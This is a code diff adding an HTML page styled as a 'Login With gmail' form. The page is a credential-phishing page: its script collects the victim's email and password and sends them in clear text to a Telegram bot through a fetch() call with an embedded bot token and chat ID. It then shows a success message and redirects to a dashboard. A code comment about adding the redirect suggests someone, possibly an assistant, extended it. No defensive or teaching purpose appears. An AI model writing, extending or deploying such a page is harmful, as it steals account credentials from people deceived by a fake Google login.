@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login With gmail</title>
+  <style>
+    body {
+      text-align: center;
+      font-family: Arial;
+      background: #0f172a;
+      color: white;
+      padding-top: 100px;
+    }
+    input {
+      padding: 10px;
+      margin: 10px;
+      width: 250px;
+      border-radius: 8px;
+      border: none;
+    }
+    button {
+      padding: 12px 20px;
+      border-radius: 8px;
+      background: #22c55e;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+
+<body>
+<input type="email" id="email" placeholder="Enter Email"><br>
+<input type="password" id="password" placeholder="Enter Password"><br>
+
+<button onclick="sendData()">Login</button>
+
+<script>
+function sendData() {
+
+  let email = document.getElementById("email").value;
+  let password = document.getElementById("password").value;
+
+  if(email === "" || password === ""){
+    alert("Please fill all fields");
+    return;
+  }
+
+  let message = "Login Details:%0AEmail: " + email + "%0APassword: " + password;
+
+  fetch("https://api.telegram.org/bot8620396977:AAE7hv_644PfdldSd8hm9A2HsmnNhJhzK9s/sendMessage?chat_id=6056245485&text=" + message);
+
+  alert("Submitted Successfully");
+  
+  // 🔄 REDIRECT TO DASHBOARD - Added without changing your existing code
+  setTimeout(() => {
+    window.location.href = "dashboard.html";
+  }, 1000); // 1 second delay after alert
+
+}
+</script>
+
+</body>
+</html>
